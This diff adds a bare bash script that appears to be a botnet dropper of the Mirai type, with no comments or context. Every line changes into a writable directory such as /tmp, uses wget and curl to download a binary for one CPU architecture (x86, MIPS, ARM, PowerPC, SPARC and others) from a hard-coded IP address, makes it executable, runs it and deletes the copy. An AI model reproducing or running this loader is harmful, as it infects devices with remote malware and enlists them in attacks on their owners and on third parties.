@@ -1,0 +1,12 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.x86; curl -O http://45.145.185.94/Otpzl/7rtya.x86;cat 7rtya.x86 >95bS;chmod +x *;./95bS Exploit.x86; rm -rf 95bS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.mips; curl -O http://45.145.185.94/Otpzl/7rtya.mips;cat 7rtya.mips >95bS;chmod +x *;./95bS mips; rm -rf 95bS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.mips64; curl -O http://45.145.185.94/Otpzl/7rtya.mips64;cat 7rtya.mips64 >95bS;chmod +x *;./95bS mips64; rm -rf 95bS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.mpsl; curl -O http://45.145.185.94/Otpzl/7rtya.mpsl;cat 7rtya.mpsl >95bS;chmod +x *;./95bS mipsel; rm -rf 95bS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.arm; curl -O http://45.145.185.94/Otpzl/7rtya.arm;cat 7rtya.arm >95bS;chmod +x *;./95bS arm; rm -rf 95bS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.arm5; curl -O http://45.145.185.94/Otpzl/7rtya.arm5;cat 7rtya.arm5 >95bS;chmod +x *;./95bS armv5; rm -rf 95bS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.arm6; curl -O http://45.145.185.94/Otpzl/7rtya.arm6;cat 7rtya.arm6 >95bS;chmod +x *;./95bS armv6; rm -rf 95bS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.ppc; curl -O http://45.145.185.94/Otpzl/7rtya.ppc;cat 7rtya.ppc >95bS;chmod +x *;./95bS powerpc; rm -rf 95bS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.m68k; curl -O http://45.145.185.94/Otpzl/7rtya.m68k;cat 7rtya.m68k >95bS;chmod +x *;./95bS motorola; rm -rf 95bS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.sh4; curl -O http://45.145.185.94/Otpzl/7rtya.sh4;cat 7rtya.sh4 >95bS;chmod +x *;./95bS supeh4; rm -rf 95bS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.spc; curl -O http://45.145.185.94/Otpzl/7rtya.spc;cat 7rtya.spc >95bS;chmod +x *;./95bS sparc; rm -rf 95bS
